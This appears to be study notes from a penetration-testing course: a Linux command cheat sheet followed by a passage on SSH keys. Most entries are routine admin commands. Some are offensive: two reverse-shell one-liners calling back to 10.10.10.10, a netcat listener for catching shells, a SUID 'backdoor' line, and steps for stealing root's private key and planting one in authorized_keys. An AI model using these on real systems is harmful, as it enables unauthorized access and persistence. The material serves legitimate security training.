## Linux

System info:
```bash
uname -a
hostnamectl
```

Hardware info:
```bash
lspci
lsusb
lsblk
```

Help:
```bash
man <command>
tldr <command>
apropos <keyword>
```

Session info:
```bash
whoami
who
id
pwd
env
ps
ps aux
```

Network info:
```bash
netstat -antp
ss
ss -lntp
nmap localhost
ip
ifconfig
```

VPN:
```
sudo openvpn lab.ovpn
```

SSH:
```bash
ssh <user>@<IP address>
ssh-keygen
scp -P <port> <user>@<IP address>:<file> <destination>
scp -P <port> <file> user>@<IP address>:<destination>
```

Files:
```bash
file test.txt
exiftool test.txt
stat test.txt
```

Listing:
```bash
ls
find / -name *passwd* 2>/dev/null
tree
locate <expression>
which <command>
# Config file created after `2020-03-03`, smaller than `28k` but larger than `25k`?
find / -type f -name *.conf -size +25k -size -28k -exec ls -la {} \; 2>/dev/null
# How many files exist on the system that have the .bak extension?
find / -type f -name *.bak 2>/dev/null | wc -l
```

Visualizing output:
```bash
cat something | more
cat something | less
cat something | head --lines 5
cat something | tail --lines 5
awk -F ',' {print $1}
sort
uniq
column -t
```

Substituting and grepping:
```bash
sed
tr ':' ' '
```

Grep:
```bash
grep
```

Counting:
```bash
wc -l
wc -c
```

HTTP requests:
```bash
wget http://inlanefreight.com
curl -LO http://inlanefreight.com
```

Permissions:
```bash
chmod
chown
# set SUID bit
chmod u+s backdoor.sh
```

Systemd:
```
systemctl
```

Crontab example:
```{bash eval=F}
crontab -l
```
```{bash eval=F}
# System Update (every six hours)
* */6 * * /path/to/update_software.sh

# Execute scripts (every first day of the month at midnight)
0 0 1 * * /path/to/scripts/run_scripts.sh

# Cleanup DB (every Sunday at midnight)
0 0 * * 0 /path/to/scripts/clean_database.sh

# Backups (every Sunday at midnight)
0 0 * * 7 /path/to/scripts/backup.sh
```

Web:
```{bash eval=F}
python3 -m http.server
python3 -m uploadserver
sudo php -S 0.0.0.0:80
```

Docker:
```bash
docker
```

RDP:
```bash
xfreerdp /v:10.10.14.2 /u:htb-student /p:HTBacademy
```

Firewall:
```bash
iptables
```

System logs:
```bash
ls /var/log
syslog
fail2ban
```


Netcat:
```{bash eval=F}
nc <ip_address> <port>      # Banner grabbing
nc -lvnp 4444               # Listening on port 4444 to catch reverse shell
```

Reverse shell:
```{bash eval=F}
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Upgrade TTY:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# CTRL+Z
stty -a     # see rows and columns
stty raw -echo; fg
# Enter, Enter
stty rows 59 columns 236
```


Hashes:
```{bash eval=F}
md5sum file.txt
```


#### SSH Keys

Finally, let us discuss SSH keys. If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:
```bash
vim id_rsa
chmod 600 id_rsa
ssh root@10.10.10.10 -i id_rsa
root@remotehost#
```
Note that we used the command `chmod 600 id_rsa` on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.

If we find ourselves with write access to a users `.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:
```{bash eval=F}
ssh-keygen -f key
```

This will give us two files: key (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:
```bash
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

Now, the remote server should allow us to log in as that user by using our private key:
```bash
ssh root@10.10.10.10 -i key
root@remotehost#
```

